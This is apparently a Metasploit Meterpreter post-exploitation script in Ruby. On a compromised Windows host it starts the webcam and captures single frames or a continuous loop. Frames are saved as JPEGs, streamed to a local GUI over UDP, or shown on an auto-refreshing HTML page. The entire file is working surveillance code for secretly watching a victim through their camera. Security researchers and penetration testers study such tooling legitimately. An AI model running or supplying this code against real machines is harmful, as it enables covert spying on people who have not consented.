#  Author: scriptjunkie
#
# Simplify running webcam, whether grabbing a single frame or running
# a continous loop.

@client = client
opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu" ],
  "-f" => [ false, "Just grab single frame"],
  "-l" => [ false, "Keep capturing in a loop (default)" ],
  "-d" => [ true, "Loop delay interval (in ms, default 1000)" ],
  "-i" => [ true, "The index of the webcam to use (Default: 1)" ],
  "-q" => [ true, "The JPEG image quality (Default: 50)" ],
  "-g" => [ false, "Send to GUI instead of writing to file" ],
  "-s" => [ true, "Stop recording" ],
  "-p" => [ true, "The path to the folder images will be saved in (Default: current working directory)"]
)

folderpath = "."
single = false
quality = 50
index = 1
interval = 1000
gui = false
opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    print_line "webcam -- view webcam over session"
    print_line(opts.usage)
    raise Rex::Script::Completed
  when "-f"
    single = true
  when "-l"
    single = false
  when "-d"
    interval = val.to_i
  when "-i"
    index = val.to_i
  when "-q"
    quality = val.to_i
  when "-g"
    gui = true
  when "-p"
    folderpath = val
  when "-s"
    print_line("[*] Stopping webcam")
    client.webcam.webcam_stop
    raise Rex::Script::Completed
  end
}

if !(client.platform =~ /win32|win64/)
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
begin
  camlist = client.webcam.webcam_list
  if camlist.length == 0
    print_error("Error: no webcams found!")
    raise Rex::Script::Completed
  elsif camlist.length < index
    print_error("Error: only #{camlist.length} webcams found!")
    raise Rex::Script::Completed
  end
  print_line("[*] Starting webcam #{index}: #{camlist[index - 1]}")
  client.webcam.webcam_start(index)

  #prepare output
  if(gui)
    sock = Rex::Socket::Udp.create(
        'PeerHost' => "127.0.0.1",
        'PeerPort' => 16235
      )
  end
  imagepath = folderpath + ::File::SEPARATOR + "webcam.jpg"
  htmlpath = folderpath + ::File::SEPARATOR + "webcam.htm"
  begin
    if single == true
      data = client.webcam.webcam_get_frame(quality)
      if(gui)
        sock.write(data)
      else
        ::File.open( imagepath, 'wb' ) do |fd|
          fd.write( data )
        end
        path = ::File.expand_path( imagepath )
        print_line( "[*] Image saved to : #{path}" )
        Rex::Compat.open_file( path )
      end
    else
      if(!gui)
        ::File.open(htmlpath, 'wb' ) do |fd|
          fd.write('<html><body><img src="webcam.jpg"></img><script>'+
            "setInterval('location.reload()',#{interval});</script></body><html>" )
        end
        print_line( "[*] View live stream at: #{htmlpath}" )
        Rex::Compat.open_file(htmlpath)
        print_line( "[*] Image saved to : #{imagepath}" )
      end
      while true do
        data = client.webcam.webcam_get_frame(quality)
        if(gui)
          sock.write(data)
        else
          ::File.open( imagepath, 'wb' ) do |fd|
            fd.write( data )
          end
        end
        select(nil, nil, nil, interval/1000.0)
      end
    end
  rescue ::Interrupt
  rescue ::Exception => e
    print_error("Error getting frame: #{e.class} #{e} #{e.backtrace}")
  end
  print_line("[*] Stopping webcam")
  client.webcam.webcam_stop
  sock.close if sock != nil
rescue ::Exception => e
  print_error("Error: #{e.class} #{e} #{e.backtrace}")
end
